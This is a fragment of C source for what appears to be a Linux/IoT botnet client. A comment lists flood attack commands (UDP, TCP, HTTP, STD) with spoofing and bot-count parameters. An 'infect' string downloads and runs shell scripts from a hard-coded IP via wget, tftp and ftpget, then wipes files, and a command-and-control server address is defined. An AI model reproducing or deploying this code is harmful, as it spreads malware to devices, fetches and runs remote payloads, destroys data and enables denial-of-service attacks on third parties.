...
/*
	...
	Note: Other Idea, make a new python scanner, to exucute load.
*/

/*

!* UDP [IP] [Port] [Sec] [Spoof Integer] [Packet Size] [Bot Integer]
!* TCP [IP] [Port] [Sec] [Spoof Integer] [Flags] [Packet Size] [Bot Integer]
!* HTTP [Method] [URL] [Port] [Path] [Sec] [Power]
!* STD [IP] [Port] [Sec]
!* UNKNOWN [IP] [PORT] [SEC]
...
char *infect[] = { "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://50.115.164.101/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 50.115.164.101 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 50.115.164.101; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 50.115.164.101 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *;exit\r\n" };
unsigned char *commServer[] = { "50.115.164.101:23" };
char *BuildName[] = { "B1NARYS SHIT" };
